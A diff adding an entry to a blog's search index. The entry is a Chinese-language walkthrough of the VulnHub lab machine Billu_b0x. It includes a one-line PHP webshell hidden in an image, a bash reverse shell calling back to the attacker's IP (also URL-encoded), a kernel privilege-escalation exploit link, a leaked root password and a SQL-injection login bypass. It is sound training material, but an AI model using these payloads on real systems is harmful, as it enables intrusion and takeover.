@@ -1,6 +1,99 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>VulnHub靶机writeup--Billu_b0x</title>
+    <url>/2020/08/28/VulnHub%E9%9D%B6%E6%9C%BAwriteup-Billu-b0x/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近闲来无事，觉得自己学习理论知识太多，实验做的比较少，就在VulnHub上下载靶机来做一做，感觉VulnHub上有些靶机挺有意思的，取得root的方式也不唯一，这篇博客是VulnHub系列的第一篇writeup，之后也会把自己做的wp分享上来。</p>
+<a id="more"></a>
+
+<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>下载靶机Billu_b0x到本地，用VMware打开，设置网络为NAT，和kali同属于一个网段。</p>
+<h2 id="进行主机扫描和端口扫描"><a href="#进行主机扫描和端口扫描" class="headerlink" title="进行主机扫描和端口扫描"></a>进行主机扫描和端口扫描</h2><p><img src="https://s1.ax1x.com/2020/08/29/d7tGwR.png" alt="d7tGwR.png"></p>
+<p>发现靶机开启了http服务，用dirb进行目录扫描</p>
+<p><code>dirb http://192.168.2.133 /usr/share/dirb/wordlists/big.txt</code></p>
+<p>根据扫描结果可以看到网站还有phpmyadmin服务，同时扫描根目录下文件有：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.2.133&#x2F;add</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.2.133&#x2F;c</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.2.133&#x2F;head </span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.2.133&#x2F;in</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.2.133&#x2F;index</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.2.133&#x2F;panel</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.2.133&#x2F;show</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.2.133&#x2F;test</span><br></pre></td></tr></table></figure>
+
+<h2 id="查看网站突破点"><a href="#查看网站突破点" class="headerlink" title="查看网站突破点"></a>查看网站突破点</h2><p>网站主页面：</p>
+<p><img src="https://s1.ax1x.com/2020/08/29/d7a06U.png" alt="d7a06U.png"></p>
+<p>主页面需要登陆，尝试爆破和万能密钥没用，看其他页面</p>
+<p><img src="https://s1.ax1x.com/2020/08/29/d708mD.png" alt="d708mD.png"></p>
+<p>上传文件没用，猜测是个静态页面，迷惑用的</p>
+<p><img src="https://s1.ax1x.com/2020/08/29/d70tkd.png" alt="d70tkd.png"></p>
+<p>phpinfo信息</p>
+<p><img src="https://s1.ax1x.com/2020/08/29/d702hn.png" alt="d702hn.png"></p>
+<p>这里提示file参数为空，尝试get提交无用，post提交：</p>
+<p><img src="https://s1.ax1x.com/2020/08/29/d7BA3t.png" alt="d7BA3t.png"></p>
+<p>通过此处将网站上的已经扫出来的文件下载，进行代码审计</p>
+<p><img src="https://s1.ax1x.com/2020/08/29/d7DVi9.png" alt="d7DVi9.png"></p>
+<p>在c.php文件中可以看到数据库的账号密码，通过前端phpmyadmin登陆</p>
+<p><img src="https://s1.ax1x.com/2020/08/29/d7DTY9.png" alt="d7DTY9.png"></p>
+<p>在数据库ica_lab下的auth表中发现网站主页登陆的用户名密码</p>
+<p><img src="https://s1.ax1x.com/2020/08/29/d7s38A.png" alt="d7s38A.png"></p>
+<p>这里发现可以通过phpmyadmin执行SQL语句，并且可以通过phpinfo知道网站绝对路径，想通过SQL写入webshell，但是发现权限不够</p>
+<p><img src="https://s1.ax1x.com/2020/08/29/d7x8RH.png" alt="d7x8RH.png"></p>
+<h2 id="上传图片马取得webshell"><a href="#上传图片马取得webshell" class="headerlink" title="上传图片马取得webshell"></a>上传图片马取得webshell</h2><p>换一种思路，通过刚才得到的用户名密码登陆网站主页：</p>
+<p><img src="https://s1.ax1x.com/2020/08/29/dHEOiR.png" alt="dHEOiR.png"></p>
+<p>在主页发现文件上传点，是用来上传用户图像的，之前爆目录的时候知道这里的路径为<code>网站根目录/uploaded_images/图片文件</code></p>
+<p><img src="https://s1.ax1x.com/2020/08/29/dHfFMQ.png" alt="dHfFMQ.png"></p>
+<p>这里可以制作一个图片马来上传：</p>
+<ol>
+<li><p>写好php代码</p>
+ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system($_GET[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用cmd来制作图片马</p>
+<p> <img src="https://s1.ax1x.com/2020/08/30/dbFafx.png" alt="dbFafx.png"></p>
+</li>
+</ol>
+<p>将图片马上传</p>
+<p><img src="https://s1.ax1x.com/2020/08/30/dbFong.png" alt="dbFong.png"></p>
+<p>图片马上传了，还需要文件包含漏洞得把这个图片让后端当成php来解析，之前在代码审计的时候，发现在panel.php有文件包含漏洞：</p>
+<p><img src="https://s1.ax1x.com/2020/08/30/dbkPE9.png" alt="dbkPE9.png"></p>
+<p>测试一下——不成功，没反应</p>
+<p>猜测是因为图片太大，php代码加在图片末尾，没加载出来。</p>
+<blockquote>
+<p>太坑了，在网上找了好久，终于找到一个图片大小比较小的，测试成功</p>
+</blockquote>
+<p><img src="https://s1.ax1x.com/2020/08/30/dbJK4P.png" alt="dbJK4P.png"></p>
+<p>可以看到这里的权限是<code>www-data</code></p>
+<h2 id="反弹一个低权限shell"><a href="#反弹一个低权限shell" class="headerlink" title="反弹一个低权限shell"></a>反弹一个低权限shell</h2><p>构建一个shell反弹出来：</p>
+<p><code>echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.2.132/4444 0&gt;&amp;1&quot; | bash</code></p>
+<p>这里要进行url编码：</p>
+<p><code>echo%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.132%2F4444%200%3E%261%22%20%7C%20bash</code></p>
+<p><img src="https://s1.ax1x.com/2020/08/30/dbjshD.png" alt="dbjshD.png"></p>
+<p>然后在终端中用nc监听</p>
+<p><img src="https://s1.ax1x.com/2020/08/30/dbj2jA.png" alt="dbj2jA.png"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>拿到shell之后，要进行提权到root权限，使用<code>uname -a</code>和<code>cat /etc/issue</code>来查看系统内核版本，考虑使用本地溢出漏洞来进行提权</p>
+<p><img src="https://s1.ax1x.com/2020/08/30/dbvAD1.png" alt="dbvAD1.png"></p>
+<p>下载exp：<a href="https://www.exploit-db.com/exploits/37292" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/37292</a></p>
+<p>注意的是网站根目录没有写权限，但是在<code>/uploaded_images/</code>是一个写权限目录</p>
+<p>为了上传文件方便，这里再写一个webshell用菜刀连上</p>
+<p><img src="https://s1.ax1x.com/2020/08/30/dbzDA0.png" alt="dbzDA0.png"></p>
+<p>直接把exp拖进去就可以了，然后编译执行，提权到root</p>
+<p><img src="https://s1.ax1x.com/2020/08/30/dqSS4f.png" alt="dqSS4f.png"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个靶机总体来说比较简单，但是渗透的时候也遇到了一些坑，增长了很多经验，值得初学者学习学习。</p>
+<h2 id="番外"><a href="#番外" class="headerlink" title="番外"></a>番外</h2><p>另外两种突破点：</p>
+<ol>
+<li><p>在test.php文件任意下载漏洞中，可以通过phpmyadmin的配置文件获取root密码，需要猜路径，根据爆破出的目录，该配置文件所在路径为：<code>/var/www/phpmy/config.inc.php</code></p>
+<p> <img src="https://s1.ax1x.com/2020/08/30/dqCfxO.png" alt="dqCfxO.png"></p>
+<p> 打开文件，可以看到root的密码是<code>roottoor</code>，直接ssh连接即可</p>
+<p> <img src="https://s1.ax1x.com/2020/08/30/dqCTZd.png" alt="dqCTZd.png"></p>
+</li>
+<li><p>根据代码审计，在对首页登陆index.php的尝试SQL注入绕过</p>
+<p> <img src="https://s1.ax1x.com/2020/08/30/dqPsl8.png" alt="dqPsl8.png"></p>
+<p> 则payload为<code>&#39;or 1=1 --\&#39;</code>（这里不太明白，或许就是or把pass和uname弄没了，导致where 1，最后查出数据库结果？）</p>
+<p> <img src="https://s1.ax1x.com/2020/08/30/dqiGhq.png" alt="dqiGhq.png"></p>
+<p> SQL注入绕过成功</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>VulnHub</category>
+      </categories>
+      <tags>
+        <tag>渗透实战</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>powershell后渗透阶段---工具篇</title>
     <url>/2020/08/18/powershell%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5-%E5%B7%A5%E5%85%B7%E7%AF%87/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近闭关修炼了一段时间，主要学习渗透测试，恶意代码分析先暂停下，学习这些东西我都有兴趣，多学些多见识见识，增加一下自己对安全的理解。</p>
